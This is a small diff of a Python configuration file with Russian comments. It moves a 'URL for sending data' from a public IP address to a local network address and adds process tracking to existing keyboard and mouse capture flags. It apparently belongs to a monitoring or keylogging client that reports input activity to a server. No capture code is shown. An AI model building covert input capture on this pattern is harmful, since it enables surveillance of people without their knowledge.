@@ -1,10 +1,11 @@
-url = 'http://195.201.111.238:8001/data'  # URL для отправки данных
+url = 'http://192.168.0.3:8001/data'  # URL для отправки данных
 
 class Config:
     # Параметры которые мы будем изменять
     properties = {
         'keyboard': True,
-        'mouse': True
+        'mouse': True,
+        'processes': True
     }
 
     # Метод для утановки значения
